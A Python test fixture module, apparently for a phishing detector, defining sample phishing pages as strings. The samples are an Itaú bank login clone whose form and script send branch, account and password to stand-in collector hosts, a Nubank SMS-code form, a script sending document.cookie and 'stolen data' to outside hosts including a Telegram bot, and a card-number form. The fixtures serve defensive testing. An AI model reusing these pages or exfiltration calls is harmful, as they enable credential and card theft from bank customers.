"""Sample phishing HTML for unit tests - credential harvesting (Itaú impersonation)."""

SAMPLE_PHISHING_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Itaú - Acesso à conta">
    <meta property="og:site_name" content="Itaú Unibanco">
    <title>Itaú - Login</title>
    <link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
    <div class="container" id="login-container">
        <img src="/assets/images/itau-logo.png" alt="Itaú Logo">
        <h1>Acesse sua conta Itaú</h1>
        <form id="loginForm" action="https://evil-collector.example.com/api/collect" method="POST">
            <div class="form-group">
                <label for="agencia">Agência</label>
                <input type="text" name="agencia" id="agencia" placeholder="Digite sua agência">
            </div>
            <div class="form-group">
                <label for="conta">Conta</label>
                <input type="text" name="conta" id="conta" placeholder="Digite sua conta">
            </div>
            <div class="form-group">
                <label for="senha">Senha</label>
                <input type="password" name="senha" id="senha" placeholder="Digite sua senha" autocomplete="current-password">
            </div>
            <input type="hidden" name="token" value="abc123">
            <button type="submit" class="btn-login">Entrar</button>
        </form>
    </div>
    <!-- Kit marker: phishkit_v2 -->
    <script src="/assets/js/jquery.min.js"></script>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var data = new FormData(this);
            fetch('https://evil-api.example.com/steal', {
                method: 'POST',
                body: data
            });
            $.ajax({
                url: 'https://backup-collector.example.com/submit',
                method: 'POST',
                data: Object.fromEntries(data)
            });
        });
    </script>
</body>
</html>
"""

SAMPLE_OTP_HTML = """
<!DOCTYPE html>
<html>
<head><title>Nubank - Verificação</title></head>
<body>
    <h1>Verificação de Segurança Nubank</h1>
    <form action="https://phish.example.com/otp" method="POST">
        <label>Código de verificação SMS</label>
        <input type="text" name="otp" placeholder="Digite o código OTP">
        <input type="text" name="token_sms" placeholder="Token SMS">
        <button type="submit">Confirmar</button>
    </form>
</body>
</html>
"""

SAMPLE_JAVASCRIPT = """
const API_KEY = "sk-live-abc123def456";
const token = "Bearer eyJhbGciOiJIUzI1NiJ9";

fetch('https://api.telegram.org/bot123456:ABC/sendMessage', {
    method: 'POST',
    body: JSON.stringify({chat_id: '-100123', text: 'stolen data'})
});

var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://collector.evil.com/data');
xhr.send(document.cookie);

axios.post('https://webhook.example.com/hook', {data: 'test'});
"""

SAMPLE_CARD_HTML = """
<!DOCTYPE html>
<html>
<body>
    <form action="/process" method="POST">
        <input type="text" name="card_number" placeholder="Número do cartão">
        <input type="text" name="cvv" placeholder="CVV">
        <input type="text" name="expiry" placeholder="Validade">
        <input type="text" name="cardholder" placeholder="Nome no cartão">
    </form>
</body>
</html>
"""
